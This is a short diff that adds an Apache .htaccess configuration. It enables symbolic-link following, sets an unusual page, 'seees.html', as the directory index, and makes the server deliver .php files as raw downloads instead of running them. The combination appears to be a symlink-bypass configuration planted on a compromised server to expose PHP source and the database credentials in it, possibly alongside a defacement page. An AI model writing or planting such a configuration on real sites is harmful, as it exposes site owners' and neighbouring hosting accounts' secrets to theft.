@@ -1,0 +1,4 @@
+Options +FollowSymLinks
+DirectoryIndex seees.html
+RemoveHandler .php
+AddType application/octet-stream .php
